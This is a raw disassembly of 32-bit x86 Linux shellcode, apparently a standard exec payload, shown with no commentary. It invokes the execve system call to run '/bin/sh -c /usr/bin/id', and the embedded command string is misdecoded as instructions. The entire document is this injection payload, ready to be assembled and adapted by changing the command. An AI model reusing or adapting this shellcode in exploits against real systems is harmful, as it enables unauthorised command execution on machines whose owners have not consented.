00000000  6A0B              push byte +0xb
00000002  58                pop eax
00000003  99                cdq
00000004  52                push edx
00000005  66682D63          push word 0x632d
00000009  89E7              mov edi,esp
0000000B  682F736800        push dword 0x68732f
00000010  682F62696E        push dword 0x6e69622f
00000015  89E3              mov ebx,esp
00000017  52                push edx
00000018  E80C000000        call dword 0x29
0000001D  2F                das
0000001E  7573              jnz 0x93
00000020  722F              jc 0x51
00000022  62696E            bound ebp,[ecx+0x6e]
00000025  2F                das
00000026  696400575389E1CD  imul esp,[eax+eax+0x57],dword 0xcde18953
0000002E  80                db 0x80
